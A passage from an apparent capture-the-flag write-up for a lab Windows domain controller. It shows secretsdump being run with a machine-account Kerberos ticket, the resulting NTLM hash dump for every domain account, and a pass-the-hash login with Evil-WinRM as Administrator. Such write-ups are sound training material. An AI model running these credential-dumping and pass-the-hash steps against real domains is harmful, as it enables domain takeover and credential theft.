[*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache

```

#### Dump Hashes

With this ticket as the machine account, I can dump hashes from the DC. The `KRB5CCNAME` environment variable will point to the ticket, and then the `-k` and `-no-pass` options will tell `secretsdump.py` to use it:

```

oxdf@hacky$ KRB5CCNAME='DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache' secretsdump.py -no-pass -k dc01.rebound.htb -just-dc-ntlm
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1108b27a9ff61ed4139d1443fbcf664b:::
ppaul:1951:aad3b435b51404eeaad3b435b51404ee:7785a4172e31e908159b0904e1153ec0:::
llune:2952:aad3b435b51404eeaad3b435b51404ee:e283977e2cbffafc0d6a6bd2a50ea680:::
fflock:3382:aad3b435b51404eeaad3b435b51404ee:1fc1d0f9c5ada600903200bc308f7981:::
jjones:5277:aad3b435b51404eeaad3b435b51404ee:e1ca2a386be17d4a7f938721ece7fef7:::
mmalone:5569:aad3b435b51404eeaad3b435b51404ee:87becdfa676275415836f7e3871eefa3:::
nnoon:5680:aad3b435b51404eeaad3b435b51404ee:f9a5317b1011878fc527848b6282cd6e:::
ldap_monitor:7681:aad3b435b51404eeaad3b435b51404ee:5af1ff64aac6100ea8fd2223b642d818:::
oorend:7682:aad3b435b51404eeaad3b435b51404ee:5af1ff64aac6100ea8fd2223b642d818:::
winrm_svc:7684:aad3b435b51404eeaad3b435b51404ee:4469650fd892e98933b4536d2e86e512:::
batch_runner:7685:aad3b435b51404eeaad3b435b51404ee:d8a34636c7180c5851c19d3e865814e0:::
tbrady:7686:aad3b435b51404eeaad3b435b51404ee:114e76d0be2f60bd75dc160ab3607215:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:989c1783900ffcb85de8d5ca4430c70f:::
delegator$:7687:aad3b435b51404eeaad3b435b51404ee:e1630b0e18242439a50e9d8b5f5b7524:::
[*] Cleaning up... 

```

### Shell

With the admin hash, I can pass that to [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to get a shell:

```

oxdf@hacky$ evil-winrm -i rebound.htb -u administrator -H 176be138594933bb67db3b2572fc91b8

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

And `root.txt`:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
4d72abcc************************

```